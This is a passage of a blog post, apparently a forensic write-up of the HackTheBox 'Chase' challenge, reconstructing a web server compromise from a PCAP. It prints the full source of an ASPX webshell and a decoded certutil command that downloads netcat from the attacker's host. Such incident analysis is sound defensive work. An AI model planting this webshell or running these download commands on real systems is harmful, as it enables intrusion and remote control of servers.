@@ -1,0 +1,702 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it.  We’ve taken a network capture before shutting the server down to take a clone of the disk.  Can y">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Chase">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Chase/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it.  We’ve taken a network capture before shutting the server down to take a clone of the disk.  Can y">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609145027142.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609150106984.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609150941045.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609151206121.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609151319151.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609152021384.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220609153311443.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.885Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:30.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Digital Forensics">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220609145027142.png">
+  
+  
+  
+  <title>HackTheBox-Chase - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Chase"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          74 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Chase</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it.  We’ve taken a network capture before shutting the server down to take a clone of the disk.  Can you take a look at the PCAP and see if anything is up?</p>
+<p>我们的一个网络服务器触发了反病毒警报，但没有一个系统管理员说他们登录过。在关闭服务器进行磁盘克隆之前，我们已经进行了网络捕获。你能看看PCAP，看看有什么进展吗?</p>
+<p>Start：</p>
+<p>首先我决定看一眼流量组成部分，在wireshark统计-&gt;协议分级中，</p>
+<p><img src="https://www.worldisend.com/img/image-20220609145027142.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609145027142"></p>
+<p>UDP占比2.8，TCP占比97.2，在TCP中又大一部分的HTTP流量，所以应该着重查看HTTP协议中的流量信息，进行初步筛选：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609150106984.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609150106984"></p>
+<p>可以很明显的看到两个IP，22.22.22.7:33618端口与22.22.22.5:80在进行访问通信。高端口一般出现在客户端，而80端口应该就是被攻击的网络服务器。也正如我想的这样。介于是HTTP明文流量。可以直接追踪TCP流。</p>
+<p>这是初始访问的流量信息：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609150941045.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609150941045"></p>
+<p>应该是被访问到了首页，因为它请求了一个welcome.png的欢迎图片。紧接着攻击者访问了upload.aspx像是文件上传的地方：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609151206121.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609151206121"></p>
+<p>会包含有一些HTLM代码，将其复制到文本文件中打开后是这样的一个页面：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609151319151.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609151319151"></p>
+<p>一个文件上传的功能点。紧接着，攻击者上传了一个文件，提交一个Key为admin的弱验证：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.aspx?operation=upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------240279915540934710361858528148<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1899<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/upload.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;authKey&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">admin</span></span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;cmd.aspx&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%@ Page <span class="hljs-keyword">Language</span>=&quot;VB&quot; <span class="hljs-keyword">Debug</span>=&quot;true&quot; %&gt;</span><br><span class="language-pgsql">&lt;%@ <span class="hljs-keyword">import</span> Namespace=&quot;system.IO&quot; %&gt;</span><br><span class="language-pgsql">&lt;%@ <span class="hljs-keyword">import</span> Namespace=&quot;System.Diagnostics&quot; %&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script runat=&quot;server&quot;&gt;      </span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Sub RunCmd(Src <span class="hljs-keyword">As</span> <span class="hljs-keyword">Object</span>, E <span class="hljs-keyword">As</span> EventArgs)            </span><br><span class="language-pgsql">  Dim myProcess <span class="hljs-keyword">As</span> <span class="hljs-built_in">New</span> Process()            </span><br><span class="language-pgsql">  Dim myProcessStartInfo <span class="hljs-keyword">As</span> <span class="hljs-built_in">New</span> ProcessStartInfo(xpath.text)            </span><br><span class="language-pgsql">  myProcessStartInfo.UseShellExecute = <span class="hljs-keyword">false</span>            </span><br><span class="language-pgsql">  myProcessStartInfo.RedirectStandardOutput = <span class="hljs-keyword">true</span>            </span><br><span class="language-pgsql">  myProcess.StartInfo = myProcessStartInfo            </span><br><span class="language-pgsql">  myProcessStartInfo.Arguments=xcmd.text            </span><br><span class="language-pgsql">  myProcess.<span class="hljs-keyword">Start</span>()            </span><br><span class="language-pgsql"></span><br><span class="language-pgsql">  Dim myStreamReader <span class="hljs-keyword">As</span> StreamReader = myProcess.StandardOutput            </span><br><span class="language-pgsql">  Dim myString <span class="hljs-keyword">As</span> String = myStreamReader.Readtoend()            </span><br><span class="language-pgsql">  myProcess.<span class="hljs-keyword">Close</span>()            </span><br><span class="language-pgsql">  mystring=replace(mystring,&quot;&lt;&quot;,&quot;&amp;lt;&quot;)            </span><br><span class="language-pgsql">  mystring=replace(mystring,&quot;&gt;&quot;,&quot;&amp;gt;&quot;)            </span><br><span class="language-pgsql">  result.text= vbcrlf &amp; &quot;&lt;pre&gt;&quot; &amp; mystring &amp; &quot;&lt;/pre&gt;&quot;    </span><br><span class="language-pgsql"><span class="hljs-keyword">End</span> Sub</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;/script&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;html&gt;</span><br><span class="language-pgsql">&lt;body&gt;    </span><br><span class="language-pgsql">&lt;form runat=&quot;server&quot;&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;L_p&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Program&lt;/asp:Label&gt;        </span><br><span class="language-pgsql">&lt;asp:TextBox id=&quot;xpath&quot; runat=&quot;server&quot; Width=&quot;300px&quot;&gt;c:\windows\system32\cmd.exe&lt;/asp:TextBox&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;L_a&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Arguments&lt;/asp:Label&gt;        </span><br><span class="language-pgsql">&lt;asp:TextBox id=&quot;xcmd&quot; runat=&quot;server&quot; Width=&quot;300px&quot; <span class="hljs-type">Text</span>=&quot;/c net user&quot;&gt;/c net <span class="hljs-keyword">user</span>&lt;/asp:TextBox&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Button id=&quot;Button&quot; onclick=&quot;runcmd&quot; runat=&quot;server&quot; Width=&quot;100px&quot; <span class="hljs-type">Text</span>=&quot;Run&quot;&gt;&lt;/asp:Button&gt;        </span><br><span class="language-pgsql">&lt;p&gt;&lt;asp:Label id=&quot;result&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;       </span><br><span class="language-pgsql">&lt;/form&gt;</span><br><span class="language-pgsql">&lt;/body&gt;</span><br><span class="language-pgsql">&lt;/html&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------240279915540934710361858528148--</span></span><br></code></pre></td></tr></table></figure>
+
+<p>不难看出这是一个webshell，因为在我复制代码进文档后Windows Defender也告警了：</p>
+<p><img src="https://www.worldisend.com/img/image-20220609152021384.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220609152021384"></p>
+<p>紧接着服务器返回了OK：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>private<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Microsoft-IIS/7.5<br><span class="hljs-attribute">X-AspNet-Version</span><span class="hljs-punctuation">: </span>2.0.50727<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>ASP.NET<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 01 Nov 2020 17:20:35 GMT<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>360<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>filesystembrowser<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css">&lt;!--</span></span><br><span class="language-css"><span class="language-xml"><span class="hljs-selector-tag">body</span>,<span class="hljs-selector-tag">table</span>,<span class="hljs-selector-tag">p</span>,pre,<span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">input</span>,<span class="hljs-selector-tag">form</span> select &#123;</span></span><br><span class="language-css"><span class="language-xml"> <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Lucida Console&quot;</span>, monospace;</span></span><br><span class="language-css"><span class="language-xml"> <span class="hljs-attribute">font-size</span>: <span class="hljs-number">88%</span>;</span></span><br><span class="language-css"><span class="language-xml">&#125;</span></span><br><span class="language-css"><span class="language-xml">--&gt;</span></span><br><span class="language-css"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">File uploaded<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>然后攻击者以get方式请求了webshell，这一步应该是确认是否上传成功，服务器返回了200 OK：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-apache"><span class="hljs-attribute">HTTP</span> /<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-attribute">Cache</span>-Control: private</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span></span><br><span class="language-apache"><span class="hljs-attribute">Server</span>: Microsoft-IIS/<span class="hljs-number">7</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-AspNet-Version: <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">50727</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-Powered-By: ASP.NET</span><br><span class="language-apache"><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">01</span> Nov <span class="hljs-number">2020</span> <span class="hljs-number">17</span>:<span class="hljs-number">20</span>:<span class="hljs-number">42</span> GMT</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">917</span></span><br></code></pre></td></tr></table></figure>
+
+<p>紧接着攻击者以POST方式提交了一串命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>313<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/cmd.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">__VIEWSTATE<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEPDwUKLTk<span class="hljs-number">5</span>MjkzMTA<span class="hljs-number">5</span>MWRkwVojPOuktGOWqG<span class="hljs-number">0</span>pwsyOK<span class="hljs-number">2</span>JElGI<span class="hljs-variable">%3</span>D&amp;__EVENTVALIDATION<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>FwEWBAKI<span class="hljs-number">2</span>YrhDgL<span class="hljs-number">71</span>d<span class="hljs-number">7</span>YCAKRuYD<span class="hljs-number">5</span>CALT<span class="hljs-variable">%2</span>Fr<span class="hljs-number">7</span>ABAPkkpTQLNd<span class="hljs-number">7</span>HWr<span class="hljs-number">8</span>RlrYcnI<span class="hljs-number">0</span>Hcmr&amp;xpath<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cwindows<span class="hljs-variable">%5</span>Csystem<span class="hljs-number">32</span><span class="hljs-variable">%5</span>Ccmd.exe&amp;xcmd<span class="hljs-operator">=</span><span class="hljs-variable">%2</span>Fc+certutil+-urlcache+-split+-f+http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">22.22</span>.<span class="hljs-number">22.7</span><span class="hljs-variable">%2</span>Fnc<span class="hljs-number">64</span>.exe+<span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>Cusers<span class="hljs-variable">%5</span>Cpublic<span class="hljs-variable">%5</span>Cnc.exe&amp;Button<span class="hljs-operator">=</span>Run</span><br></code></pre></td></tr></table></figure>
+
+<p>将其解码之后：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/c+certutil+-urlcache+-split+-f+http://22.22.22.7/nc64.exe+c:\users\public\nc.exe&amp;Button<br></code></pre></td></tr></table></figure>
+
+<p>通过windows内置的白名单程序远程下载了nc并保存到了c:\users\public\目录下。之后都是服务器200OK的返回包，紧接着攻击者对webshell发起了第二个请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cmd.aspx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>22.22.22.5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>458<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://22.22.22.5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://22.22.22.5/cmd.aspx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">__VIEWSTATE<span class="hljs-operator">=</span><span 